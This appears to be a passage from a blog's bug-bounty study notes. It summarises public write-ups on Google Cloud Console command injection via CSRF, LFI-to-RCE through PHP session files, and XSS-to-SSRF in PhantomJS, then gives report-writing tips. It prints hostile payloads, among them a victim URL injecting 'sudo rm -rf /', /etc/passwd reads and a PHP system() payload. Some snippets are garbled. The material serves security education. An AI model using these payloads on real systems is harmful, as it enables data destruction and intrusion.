<a href="https://medium.com/@pranavvenkats/how-i-got-6000-from-google-a4670aa4158d">How I got 6000$ from #Google. Hey all , | by Pranav Venkat | Medium</a>
<strong>GOOGLE CLOUD CONSOLE</strong></p>
<p>Google Cloud Console <a href="http://console.cloud.google.com/">console.cloud.google.com</a> is a Web interface that allows users to manage Google Cloud Platform resources. Each user creates his online virtual machine and runs commands on it.
<strong>INTERESTING PARAMETER</strong></p>
<p>Project name parameter was inspected:
<a href="https://console.cloud.google.com/home/dashboard?project=Value">https://console.cloud.google.com/home/dashboard?project=Value</a></p>
<p><strong>Attack payloads</strong>:
• Inserted a project name belonging to another victim.
 Unauthorized
• Inserted XSS payload
 Crash error in console output
<strong>COMMAND INJECTION PAYLOAD</strong>
<a href="https://cons/">https://cons</a>&hellip;google.com/home/dashboard?project=;cat
Command worked on the VM owned by the researcher and the output displayed in the console</p>
<p>The command injection payload was sandboxed as it worked only on the researcher‘s machine.
CSRF helped in injecting the command on another victim user‘s machine. Trick a user to
visit the following URL while being logged in: <a href="https://cons/">https://cons</a>&hellip;google.com/home/dashboard?project=;sudo rm -rf /</p>
<h4 id="escalating-lfi-to-rce">Escalating LFI to RCE</h4>
<p>💡 Vulnerability allowed to execute arbitrary code on the server through local file inclusion
<a href="https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/">Upgrade from LFI to RCE via PHP Sessions - RCE Security</a>
<strong>INTERESTING PARAMETER</strong></p>
<p>INTERESTING PARAMETER Parameter called <code>lang</code> to specify the language for UI
LFI payload that reads <code>/etc/passwd</code> file worked</p>
<p>The researcher tried multiple attempts to escalate to Remote Code Execution (RCE)
without success.
<code>Injecting PHP wrappers: expect://command php://input</code>
Loading files with controllable input such as:
<code>/var/log/apache/access.log /var/log/apache/error.log /var/log/vsftpd.log /proc/self/environ</code>
<strong>MORE ANALYSIS</strong></p>
<p>When supplying invalid credentials, a session id is set in the response</p>
<p>PHP5 stores session information by default in /var/lib/php5/sess_[PHPSESSID]. The file should be named <code>sess_{Session id}</code>. The researcher was interested to read such file to see if it can help in escalating to RCE. So, the researcher got back to login request, sent the request with default lang parameter value of en_us.php to get a <code>PHPSESSID</code> cookie from the server. By using the LFI, a payload is injected in order to load the current session file to investigate its contents. The payload used in lang parameter was as follows:
<code>/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27</code></p>
<p>To achieve remote code execution, the researcher used a PHP code in his username in login request, which should be stored in his session file.
The used payload was <code>user=&lt;?php system(&quot;cat /etc/passwd&quot;);?&gt;</code> , that if executed, should run cat command, and return the contents of the <code>/etc/passwd</code> file. Note that the PHPSESSID cookie value <code>i56kgbsq9rm8ndg3qbarhsbm27</code> is passed so that the server updates the session file attached to such session</p>
<p>By including the loading session file again after injecting an arbitrary code in it, the application executed the command returning the contents of /etc/passwd. Note that the session id is not passed in such request to avoid overwriting the username that has already been filled with arbitrary code. The attack succeeded to escalate to RCE as the session variable was logged in the session file without proper validation. In addition, the session file was included using the LFI leading RCE.
Similar write-ups are available at:</p>
<p><a href="https://medium.com/bugbountywriteup/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899">https://medium.com/bugbountywriteup/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899</a></p>
<p><a href="https://medium.com/@p4c3n0g3/lfi-to-rce-via-access-log-injection-88684351e7c0">https://medium.com/@p4c3n0g3/lfi-to-rce-via-access-log-injection-88684351e7c0</a></p>
<h4 id="escalating-xss-to-ssrf-and-local-file-read">Escalating XSS to SSRF and Local-File Read</h4>
<p>💡 <strong>Vulnerability allowed access to arbitrary local-file read on the server</strong></p>
<p><a href="https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/">Escalating XSS in PhantomJS Image Rendering to SSRF/Local-File Read | Brett Buerhaus</a></p>
<p><strong>NORMAL SCENARIO</strong></p>
<p><code>https://website/download?background=file.jpg&amp;author=Brett&amp;header=Test&amp;text=&amp;width=500&amp;height=500</code></p>
<p>The header parameter value is reflected in the application response as an image title</p>
<p><code>https://website/download?background=file.jpg&amp;author=Brett&amp;header=&quot;&gt;test&amp;text=&amp;width=500&amp;height=500</code></p>
<p>HTML injection payload returned and rendered in the response without encoding</p>
<p><code>https://website/download?background=file.jpg&amp;author=Brett&amp;header=&lt;iframesrc=https://xss.buer.haus/ssrftest&gt;&lt;/iframe&gt;&amp;text=&amp;width=500&amp;height=500</code></p>
<p>The headers of the received HTTP request from the app server shows that the application is using the client headless browser PhantomJS. The browser is used by the server to generate HTML pages and load images to be rendered in the response sent to the user.</p>
<p>The researcher then tried injecting JavaScript code by inserting the following payload in the header parameter:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src </span><span style="color:#f92672">=</span><span style="color:#e6db74">”x”</span> <span style="color:#a6e22e">onerro </span><span style="color:#f92672">=</span><span style="color:#e6db74">”document.wirte(’test’)</span>&gt;
</span></span></code></pre></div><p>The JavaScript code works leading to XSS</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;xasdfasdf&#34;</span> <span style="color:#a6e22e">onerro</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;document.write(&#39;&lt;iframe src=file:///var/task/redcated.html&gt;&lt;/iframe&gt;&#39;)&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span></code></pre></div><p>In the previous exploit, the researcher could get file path in /var/task/[redacted].html. In the current exploit, he placed this file path inside the iframe to read its contents by injecting the following payload:</p>
<hr>
<h1 id="reporting-the-finding">REPORTING THE FINDING</h1>
<p>💡 <strong>Proof of Concept (PoC) that explains how to reproduce the attack step-by-step</strong></p>
<p>PoC should include:</p>
<p>• User profiles for victims and attackers
• Attack payloads used
• Screenshots that show evidence</p>
<h4 id="impact">IMPACT</h4>
<p>💡 Explain what could happen when exploiting the issue and why it exposes a security risk. Examples include:</p>
<p><code>XSS attack</code> that allows a user with guest privilege to inject scripts that work in dashboard pages accessible by admins.</p>
<p><code>Logic attack</code> that allows any business owner to take over accounts of other business accounts.</p>
<p><code>CSRF</code> attack that allows changing passwords and taking over other users’ accounts.</p>
<p><code>SSRF</code> chained with Open Redirect that leads to unauthorized access to internal APIs and secret keys</p>
<h4 id="attack-story-players">ATTACK STORY PLAYERS</h4>
<p>💡 Attack story players include the victims and the attacker and their privileges.
Conditions that need to be satisfied in order for the attack to succeed
Examples include:</p>
<p>• Both attacker and victim need to have current bank accounts
• Attacker needs to have business user account in a social networking app
• The attacker needs to have a dependent in a website that manages telecom</p>
<h4 id="location-of-the-bug">LOCATION OF THE BUG</h4>
<p>💡 The location would clearly mention the following:</p>
<p>• <code>URI</code>: Full URI
• <code>HTTP Method</code>: GET, POST, PUT, DELETE,..
• <code>Param Name</code>: Name of the parameter
• <code>Param Type</code>: Body, Cookie, URI, and headers</p>
<h4 id="payloads-and-evidence">PAYLOADS AND EVIDENCE</h4>
<p>💡 How did we prepare parameters used in logic attack parameters? Did we chain with other
attacks such as enumeration attack and info disclosure?</p>
<p><code>/cart/ab5de1/view</code>
<code>/updateUser?id=1672345</code></p>
<p>SQL payload execution without false positives:
<code>select @@version vs ' or 1 =1</code></p>
<p>XSS script context demonstration:
<code>alert(document.domain)</code></p>
<h4 id="screenshots">SCREENSHOTS</h4>
<p>💡 Screenshots help elaborate the attack scenario and the evidence</p>
<h4 id="exploits">EXPLOITS</h4>
<p>💡 Evidence for exploitation that doesn’t violate the bug bounty program terms:</p>
<ul>
<li>Python scripts</li>
<li>JavaScript code</li>
<li>Burp intruder</li>
<li>SQLMap runs</li>
<li>CSRF forms</li>
<li>Burp Collaborator</li>
<li>XSS Hunter logs</li>
<li>Attack server logs</li>
</ul>
<h4 id="rejected-reports">REJECTED REPORTS</h4>
<p>💡</p>
<p><code>By design features</code> that are not considered a threat, such as Invite/Promo code
enumeration in Uber bug bounty program.</p>
<p><code>Out-of-scope targets</code> or features, such as third-party apps or websites that integrate with
the target.</p>
<p><code>Out-of-scope attacks</code>, such as Content Injection in Facebook (including &ldquo;HTML injection&rdquo;)
unless it has a significant risk.</p>
<p><code>Non-exploitable attacks</code>, such as self XSS, Unchained Open Redirects, and missing cookie
flags.</p>
<p><code>Violating program rules</code>, such as attacking other users or escalating server-side
exploitation without permission.</p>
<p><code>Duplicate reports</code> or incomplete evidence that does not provide complete information
for reproducing the issue</p>
<h4 id="goodbad-reports-examples">GOOD/BAD REPORTS EXAMPLES</h4>
<p>💡</p>
<p><strong>Bad Report</strong>:
There&rsquo;s an XSS in Test App support form. When the attacker submits JavaScript code to the 
server, it will execute in the admin page.</p>
<p><strong>Good report</strong> 
There is an XSS vulnerability in Test App support form. Steps to reproduce are as follows:</p>
<ol>
<li>
<p>Attacker with guest privilege goes to <a href="https://test.app/support_form">https://test.app/support_form</a></p>
</li>
<li>
<p>Attacker clicks “Submit inquiry” and edits the inquiry field.</p>
</li>
<li>
<p>Attacker inserts the &ldquo;&gt; …..in the text field 
and Clicks on “submit” [Screenshot].</p>
</li>
<li>
<p>Once a victim user with admin privileges reviews the client inquiry over the URI 
<a href="https://admin.app/review">https://admin.app/review</a> while being logged in, the script works [Screenshot] .</p>
</li>
</ol>
<p>Reference guidelines for improving reports submissions can be found on the following links:</p>
<p><a href="https://sites.google.com/site/bughunteruniversity/improve">https://sites.google.com/site/bughunteruniversity/improve</a></p>
<p><a href="https://docs.hackerone.com/hackers/quality-reports.html">https://docs.hackerone.com/hackers/quality-reports.html</a></p>
<p><a href="https://www.facebook.com/notes/facebook-bug-bounty/a-bounty-hunters-guide-to-facebook/946955115318715">https://www.facebook.com/notes/facebook-bug-bounty/a-bounty-hunters-guide-to-facebook/946955115318715</a></p>
<p><a href="https://www.twitter.com/sl4x0">Follow me on Twitter!</a> 😁</p>

    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
